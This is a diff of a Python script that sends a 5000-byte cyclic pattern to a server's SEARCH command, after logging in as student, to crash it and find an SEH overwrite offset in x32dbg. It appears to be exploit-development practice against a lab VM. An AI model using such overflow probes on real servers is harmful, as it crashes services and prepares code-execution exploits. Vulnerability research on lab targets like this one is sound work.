@@ -1,10 +1,7 @@
 #!/usr/bin/env python3
-# Find the SEH offset for the LOGIN vuln.
-#   1) python3 offset.py send         -> crash the server with a cyclic pattern
-#   2) python3 offset.py find 0xNNNN  -> print the offset (dword from ERC --SEH)
 import socket, sys, struct
 
-HOST = "192.168.157.2"   # server VM IP
+HOST = "192.168.157.135"
 PORT = 2121
 LEN  = 5000
 
@@ -24,7 +21,8 @@ if len(sys.argv) < 2:
 if sys.argv[1] == "send":
     p = pattern(LEN).encode()
     s = socket.create_connection((HOST, PORT)); s.recv(4096)
-    s.sendall(b'LOGIN "' + p + b'" x\r\n'); s.close()
+    s.sendall(b"LOGIN student student\r\n"); s.recv(4096)
+    s.sendall(b'SEARCH "' + p + b'" x\r\n'); s.close()
     print("sent %d-byte pattern - now run  ERC --SEH  in x32dbg" % LEN)
 
 elif sys.argv[1] == "find":
